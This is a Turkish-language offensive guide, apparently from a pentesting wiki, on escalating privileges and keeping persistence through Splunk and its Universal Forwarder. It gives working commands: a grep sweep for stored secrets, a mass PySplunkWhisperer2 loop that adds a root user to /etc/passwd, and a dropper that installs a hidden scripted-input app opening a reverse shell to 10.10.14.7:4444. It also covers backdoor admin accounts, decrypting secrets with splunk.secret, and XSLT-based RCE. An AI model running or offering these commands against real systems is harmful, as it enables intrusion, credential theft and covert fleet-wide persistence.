# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Eğer bir makineyi **içten** veya **dıştan** **enumerating** ederken **Splunk running** bulursanız (genelde web UI için **8000** ve management API için **8089**), geçerli kimlik bilgileri çoğu zaman app installation, scripted inputs veya management actions aracılığıyla **code execution** elde etmek için kullanılabilir. Eğer Splunk **root** olarak çalışıyorsa, bu çoğu zaman doğrudan bir **privilege escalation** olur.

Eğer sadece genel remote attack surface, enumeration veya app-upload RCE yolu gerekiyorsa, şuraya bakın:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Eğer zaten **root** iseniz ve Splunk service yalnızca localhost üzerinde dinlemiyorsa, ayrıca **Splunk password hashes** çalabilir, **encrypted secrets** kurtarabilir veya yerel olarak ya da birden fazla forwarder arasında persistence sağlamak için **malicious app** gönderebilirsiniz.

## Interesting Local Files

Bir host üzerinde Splunk veya Splunk Universal Forwarder ile karşılaştığınızda, genelde en ilginç path’ler şunlardır:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Önemli artifact’lar:

- **`$SPLUNK_HOME/etc/passwd`**: yerel Splunk kullanıcıları ve parola hash’leri.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk tarafından birkaç `.conf` dosyasında saklanan secrets’ları şifrelemek için kullanılan anahtar.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: ilk admin bootstrap dosyası; gold image’larda ve provisioning hatalarında kullanışlıdır. `etc/passwd` zaten mevcutsa yok sayılır.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs’in genellikle etkinleştirildiği yer.
- **`$SPLUNK_HOME/etc/deployment-apps/`** veya **`$SPLUNK_HOME/etc/apps/`**: kalıcı bir app gizlemek veya zaten dağıtılanları incelemek için iyi yerlerdir.

## Splunk Universal Forwarder Agent Exploit Summary

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) adresine bakın. Bu sadece bir özet:

**Exploit overview:**
Splunk Universal Forwarder (UF) hedefleyen bir exploit, **agent password** sahibi saldırganların agent çalışan sistemlerde rastgele code çalıştırmasına izin verir; bu da ortamın büyük bir kısmının ele geçirilmesine yol açabilir.

**Why it works:**

- UF yönetim servisi genellikle **TCP 8089** üzerinde açıktır.
- Saldırganlar API’ye authenticate olabilir ve forwarder’a bir **malicious app bundle** kurmasını söyleyebilir.
- Aynı primitive, yerelde **LPE** veya uzaktan **RCE** için kullanılabilir.
- **SplunkWhisperer2** gibi public tooling, app bundle’ı otomatik oluşturur ve Linux hedefler için payload’ları uyarlayabilir.

**Common ways to recover the password:**

- Dokümantasyon, scriptler, shares veya deployment automation içinde düz metin credentials.
- `$SPLUNK_HOME/etc/passwd` içindeki password hash’leri ve ardından offline cracking.
- `user-seed.conf` gibi golden images veya provisioning artıkları.

**Impact:**

- Ele geçirilen her host üzerinde SYSTEM/root-level code execution.
- Persistent apps, backdoor’lar veya ransomware dağıtımı.
- Veriler iletilmeden önce telemetry’yi devre dışı bırakma veya manipüle etme.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs veya Malicious Apps üzerinden Persistence

Eğer `root`/`splunk` olarak **filesystem write access**'iniz varsa ya da app yüklemek için authenticated access'iniz varsa, çok güvenilir bir persistence mekanizması, **scripted input** içeren **custom app** bırakmaktır. Splunk'ın kendi documentation'ı, scripted inputs'un bir app directory altında bulunmasını ve `inputs.conf` üzerinden enable edilmesini bekler.

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Hızlı Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notlar:

- Aynı numara **Universal Forwarder** üzerinde `/opt/splunkforwarder/etc/apps/` kullanılarak da çalışır.
- Saldırganlar genellikle bariz kötü amaçlı bir app oluşturmak yerine meşru bir add-on'u değiştirerek ortamla uyum sağlar.
- Bir **deployment server** üzerinde, `deployment-apps/` içine kötü amaçlı bir app yerleştirmek **fleet-wide persistence** haline gelir; çünkü forwarder'lar poll eder, güncellenmiş app'leri indirir ve çoğu zaman uygulamak için yeniden başlatılır.

## Credential Theft and Admin Takeover

Splunk'un yerel dosyalarını okuyabiliyorsanız, genellikle iki iyi hedef vardır: **Splunk admin access**'i geri kazanmak ve **encrypted service credentials**'ı geri kazanmak.

### Password hashes and local users

Splunk yerel authentication verisini `etc/passwd` içinde saklar. Deployment'a bağlı olarak, bu dosyayı crack etmek web UI ve management API için çalışan credentials'ı geri kazandırabilir.

Zaten geçerli **admin** credentials'ınız varsa ve Splunk **native** authentication backend kullanıyorsa, persistence için CLI'nın kendisi kullanılabilir:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` ve encrypted values

Splunk, birden fazla configuration file içinde saklanan sensitive values’ları korumak için `etc/auth/splunk.secret` kullanır. Eğer hem **secret**’ı hem de ilgili **`.conf` files**’ları çalabilirsen, çoğu zaman şunları recover veya replay edebilirsin:

- `pass4SymmKey` gibi forwarder/indexer shared secrets
- `sslPassword` gibi TLS private-key passwords
- `bindDNPassword` gibi LDAP bind credentials

Bu, Splunk admin password’unun kendisi crackable olmasa bile **lateral movement** için faydalıdır.

### `user-seed.conf` abuse

`user-seed.conf` yalnızca ilk start sırasında veya `etc/passwd` yoksa kullanılır. Bu yüzden canlı bir box üzerinde daha az kullanışlıdır, ama şunlarda çok ilginçtir:

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk’ın otomatik olarak yeniden initialize edildiği appliances

Bu durumlarda, `splunk hash-passwd` ile üretilmiş bir `HASHED_PASSWORD` yerleştirmek, yeniden deployment sonrası admin access’i sessizce geri almanın bir yolunu verir.

## Abusing Splunk Queries

Daha fazla detay için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) kontrol et.

Faydalı ve yakın tarihli bir technique, vulnerable Splunk Enterprise sürümlerinde **user-supplied XSLT**’yi abuse ederek düşük yetkili authenticated account’u `splunk` user’ı olarak **OS command execution**’a çevirmektir.

Yüksek seviyeli akış:

1. Splunk’a authenticate ol.
2. Preview/upload functionality üzerinden malicious bir **XSL** file yükle.
3. Splunk’ın search results’ları **dispatch** directory’den yüklenen bu stylesheet ile render etmesini sağla.
4. XSLT payload’u kullanarak bir file yaz veya Splunk’ın search pipeline’ı üzerinden execution tetikle (örneğin `runshellscript` gibi internal functionality’lere ulaşarak).

Buradaki önemli offensive takeaway, bu yolun **app upload gerektirmeyen post-auth RCE** olmasıdır. Linux üzerinde genellikle seni **`splunk`** account’una düşürür; bu da yine değerlidir çünkü bu user çoğu zaman application tree’nin sahibidir, secrets’ları okuyabilir ve shell loss sonrası bile kalıcı kalan persistent apps yerleştirebilir.

Exploitation sırasında kullanılan temsilî bir path şöyledir:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk çok fazla yetkiyle çalışıyorsa veya `splunk` kullanıcısının tehlikeli scriptlere, yazılabilir service unit’lere ya da kötü `sudo` kurallarına erişimi varsa, bu temiz bir **LPE** zinciri haline gelir.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
